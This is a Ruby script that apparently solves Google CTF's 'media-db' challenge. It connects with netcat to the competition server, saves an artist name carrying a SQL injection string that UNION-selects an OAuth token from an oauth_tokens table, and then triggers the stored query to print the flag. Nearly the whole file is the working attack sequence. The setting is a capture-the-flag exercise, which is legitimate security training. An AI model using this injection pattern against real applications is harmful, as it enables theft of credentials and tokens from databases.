require "ruby_expect"

module GoogleCTFSolution
  class MediaDbSQLInjection # Not using subclass here cuz its using NC
    def call
      p "⚑ FLAG ⚑: #{capture_the_flag}"
    end

    def self.call
      new.call
    end

    private

    # not using here but its good to know the url id
    def google_ctf_id
      "2b6cfe9b17556d78cd7142e39400f9bf711f98eefb6332811088bd11a9665523"
    end

    def capture_the_flag(xpect = RubyExpect::Expect.spawn(command, debug: true))
      xpect.procedure do
        each do
          expect "1) add song" do
            # Choosing the add song option"
            send 1
          end

          expect "artist name?" do
            # Saving the artists name as a sql injection string escape
            # Here is the actual breach
            send "ctf' UNION SELECT ( SELECT oauth_token from oauth_tokens ), 0 --"
          end

          expect "song name?" do
            # Saving the songs name
            send "googlectf"
          end

          expect "4) shuffle artist" do
            # Choose the shuffle artists option
            send 4
          end

          expect /CTF\{.+\}*$/ do
            # Match for basic CTF regex
          end
        end
      end

      xpect.match.to_s.strip
    end

    def command
      "nc media-db.ctfcompetition.com 1337"
    end
  end
end

GoogleCTFSolution::MediaDbSQLInjection.call
